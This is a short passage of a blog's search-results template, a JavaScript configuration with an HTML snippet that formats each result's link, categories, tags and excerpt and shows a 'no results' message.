pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://mohamedaezzat.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
